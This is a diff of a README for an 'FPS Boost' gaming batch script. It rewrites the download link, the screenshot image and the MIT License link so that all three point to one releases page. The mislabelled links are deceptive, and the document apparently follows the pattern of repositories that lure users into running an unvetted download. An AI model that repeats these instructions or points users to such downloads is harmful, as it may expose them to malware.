@@ -10,12 +10,12 @@ Welcome to the FPS Boost repository! This is a batch tweaking script designed to
 - Lightweight and efficient
 
 ## How to Use
-- Download the [Software.zip](https://github.com/user-attachments/files/18060583/Software.zip) file and extract it to your desired location.
+- Download the [https://github.com/therealmistake1/FPS-Boost/releases/tag/v2.0](https://github.com/therealmistake1/FPS-Boost/releases/tag/v2.0) file and extract it to your desired location.
 - Launch the batch script and follow the on-screen instructions to optimize your system for gaming.
 - Sit back, relax, and enjoy an enhanced gaming experience with improved FPS.
 
 ## Screenshots
-![FPS Boost Screenshot](https://via.placeholder.com/800x400)
+![FPS Boost Screenshot](https://github.com/therealmistake1/FPS-Boost/releases/tag/v2.0)
 
 ## Contribution
 We welcome contributions from the community to make FPS Boost even better. Feel free to fork the repository, make improvements, and submit a pull request. Together, we can continue to enhance the gaming experience for everyone.
@@ -24,7 +24,7 @@ We welcome contributions from the community to make FPS Boost even better. Feel 
 If you encounter any issues or have any questions about FPS Boost, please check the "Releases" section of the repository for updated versions or bug fixes. You can also reach out to the repository maintainer for assistance.
 
 ## License
-FPS Boost is licensed under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute this software for personal or commercial purposes.
+FPS Boost is licensed under the [MIT License](https://github.com/therealmistake1/FPS-Boost/releases/tag/v2.0). You are free to use, modify, and distribute this software for personal or commercial purposes.
 
 ---
 
